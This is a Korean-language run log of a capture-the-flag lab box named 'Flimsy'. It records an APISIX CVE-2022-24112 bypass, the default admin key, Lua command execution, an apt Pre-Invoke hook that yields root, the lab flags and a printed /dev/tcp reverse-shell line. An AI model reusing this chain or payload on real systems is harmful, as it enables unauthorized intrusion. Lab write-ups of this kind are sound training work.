# Flimsy — 실행 기록 (2026-08-20)

타겟 `192.168.248.220` · LHOST `192.168.45.207` · Fundamental · 리눅스 · 플래그 2/2

## 판정

**완료 2/2.** 노트 `03. PG\Flimsy.md` (714행, 신규).

경로: tcp/43500 Apache APISIX 2.8 → CVE-2022-24112 (`batch-requests` 의 `X-Real-IP` 위조로 Admin API IP 허용목록 우회) → 기본 admin key `edd1c9f034335f136f87ad84b625c8f1` 로 라우트 생성, `filter_func` Lua `os.execute` → `franklin`(uid 65534) → 세계쓰기 `/etc/apt/apt.conf.d` + 매분 `root apt-get update` → `APT::Update::Pre-Invoke` 훅 → SUID bash → root

## 플래그 (2026-08-20 인스턴스)

| | 값 | 경로 | 셸 종류 | 컨텍스트 |
|---|---|---|---|---|
| user | `ad396f9bb652fedd964f20285dab04cd` | `/home/franklin/local.txt` | 리버스셸 + PTY (`franklin@flimsy`) | `whoami; id; hostname; hostname -I; date; cat` 한 화면 |
| root | `0c8587812f2ae784dbb5642833405d2e` | `/root/proof.txt` | SUID bash `-p` (`euid=0`) | 동일 |

둘 다 원위치 `cat`. 웹셸 아님. 증거 파일 `~/PG/Flimsy/proof_user.txt`(390B) · `proof_root.txt`(407B).

## 타임라인

| KST | |
|---|---|
| 21:22 | 디렉터리 생성, ping 확인 |
| 21:23 | top-1000 예열(22·80·3306) + `-p-` 완료(9443·43500 추가 발견) |
| 21:25 | batch-requests 우회 검증 200, 라우트 생성 201 |
| 21:26 | `tee` 버퍼링으로 셸 안 보임 → 리스너 재기동 |
| 21:27 | 셸 확보 (franklin) |
| 21:28 | user 플래그 + harvest |
| 21:31 | apt 훅 설치 |
| 21:33 | root 플래그 |
| 21:35 | 스크린샷, 흔적 확인 |
| 21:38~21:47 | 정리 — 타겟 파일 삭제 성공, APISIX 라우트 삭제 실패 |

user 까지 6분, root 까지 11분.

## 헛다리 / 막힌 곳

1. **top-1000 이 43500 을 안 준다.** 22·80·3306 만 나온다. `-p-` 를 기다린 것이 이 박스의 전부.
2. **80 번 "Upright" 정적 템플릿은 완전한 미끼.** gobuster 전량 → `/img` `/css` `/js` 뿐.
3. **3306 외부 접속 불가** — `1130 - Host '192.168.45.207' is not allowed`. 바인딩은 0.0.0.0 이지만 grant 가 localhost.
4. **`nc | tee` 블록 버퍼링** — 셸이 붙었는데 화면 무출력. 로그 파일이 94바이트(배너)에서 안 늘어나는 것으로 판별.
5. **`printf` 훅 파일 깨짐** — send-keys 통과 중 `\n` 이 벗겨져 내용 끝에 리터럴 `n`. `cat -A` 로 잡음.
6. **정리 중 `C-c` 로 root 셸 상실** — 리버스셸 페인의 `C-c` 는 원격 curl 이 아니라 로컬 `nc` 를 죽인다.

## 미완 / 관리자 판단 필요

- **APISIX 라우트 `id=pwn1` 삭제 여부 불명.** `uri=/pwn1`, `filter_func` 안에 `192.168.45.207:443` 리버스셸. 21:38 에 batch-requests DELETE 를 한 번 보냈으나 응답 없음. 직후 APISIX 가 응답 불능이 되어 검증 불가. **남아 있다고 가정하는 쪽이 안전.** 박스 리버트 시 소멸.
- **APISIX 서비스가 응답 불능 상태로 남음** (43500 TCP open / HTTP 무응답, 12:36 UTC 이후). 22·80·3306·ping 은 정상. 원인은 `[가정]` — 매분 도는 `run.sh` 의 `nohup etcd &` + `apisix start` 누적 + gobuster 41만 요청. **실측 미확인.**
- **`/var/log/nginx/access.log` 에 우리 IP 419,573행 / 43,040,628 바이트.** 대부분 gobuster(21:23~21:38 방치). 삭제하지 않음.
- 신규 태그 **없음.** 사용한 7개 leaf 전부 볼트에 기존 존재.

## 박스 이미지에 남아 있던 타인의 흔적 (우리가 만든 것 아님)

Admin API 첫 조회 시 라우트가 이미 하나 존재했다.

```
id=index, uri=/rms/fzxewh, name=wthtzv
filter_func = function(vars) os.execute('bash -c "0<&160-;exec 160<>/dev/tcp/192.168.118.3/80;sh <&160 >&160 2>&160"'); return true end
create_time = 1658799753  (2022-07-26)
upstream node = schmidt-schaefer.com
```

이전 작업자의 리버스셸이 이미지에 굳은 것. 덮어쓰지 않고 `routes_preexisting.json` 으로 보존하고 우리 라우트는 `id=pwn1` 로 분리했다.

## 되돌린 것 (부재 확인 완료)

```
/bin/ls: cannot access '/etc/apt/apt.conf.d/99zzpwn': No such file or directory
/bin/ls: cannot access '/tmp/rootbash': No such file or directory
/bin/ls: cannot access '/tmp/h.sh': No such file or directory
/bin/ls: cannot access '/tmp/.h': No such file or directory
```

훅 삭제 → 크론 한 사이클 대기 → 바이너리 삭제 순서(역순이면 재생성된다).

Kali: tmux `no server running`, 80/443/8080 리스너 없음, `/tmp/wwwfli` 삭제 확인.

## 로그 (확인만, 삭제 안 함)

| 대상 | 결과 |
|---|---|
| `/var/log/nginx/access.log` | 우리 IP 419,573행 / 43MB |
| `/usr/local/apisix/logs/access.log` | 우리 IP 49행 |
| `/var/log/auth.log` | 우리 세션 **없음** (CRON 세션만). 리버스셸은 PAM 미경유 |
| `wtmp` (`last`) | 우리 항목 **없음** (pty 로그인 아님) |
| `/var/log/apt/history.log` | 훅 걸린 기간의 `apt-get update` 항목. `Pre-Invoke` 명령 자체는 미기록 |
| `/var/log/syslog`, `btmp`, APISIX `error.log` | **확인하지 않음** (셸 상실 후 불가) |

## 산출물

`~/PG/Flimsy/` — 26개 (`ls | wc -l` 실측).

정리 중 `shell443.log`(94B, tee 실패 증거)와 `routes_after_cleanup.json`(0B, 정리 실패 증거)을 실수로 삭제했다가 복원했다. `shell443.log` 는 세션 기록의 원문으로 바이트 단위 동일 복원(`wc -c` = 94 로 검증), mtime 만 21:55 로 다르다. 경위는 `writeup_notes.txt` 말미와 노트 §6-2 콜아웃에 명시.

스크린샷 1건 볼트 반입 확인:

```
-rw-r--r-- 1 QQ 197609 523400 Aug 20 21:35 파일보관\PG-Flimsy-80-upright-decoy.png
```

Kali 원본 `shot_80_upright_decoy.png` 도 523400 바이트로 동일.

43500 은 본문이 JSON 한 줄이고 버전 정보가 응답 헤더에 있어 스크린샷이 로그보다 정보량이 적다 → 찍지 않음.
